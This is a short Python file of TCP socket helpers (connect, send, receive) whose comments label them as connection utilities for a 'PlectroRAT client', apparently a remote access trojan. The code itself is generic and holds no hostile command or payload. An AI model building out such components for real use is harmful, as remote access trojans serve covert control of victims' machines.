

# Connection utilities for PlectroRAT client
# Provides helper functions for connecting, sending, and receiving data over TCP

import socket

def create_connection(host, port):
    """Establish a TCP connection to the specified host and port."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def reliable_send(sock, data):
    """Send data over a socket connection with encoding."""
    if isinstance(data, str):
        data = data.encode("utf-8")
    sock.sendall(data)

def reliable_receive(sock, buffer_size=4096):
    """Receive data from a socket and decode it."""
    data = sock.recv(buffer_size)
    return data.decode("utf-8")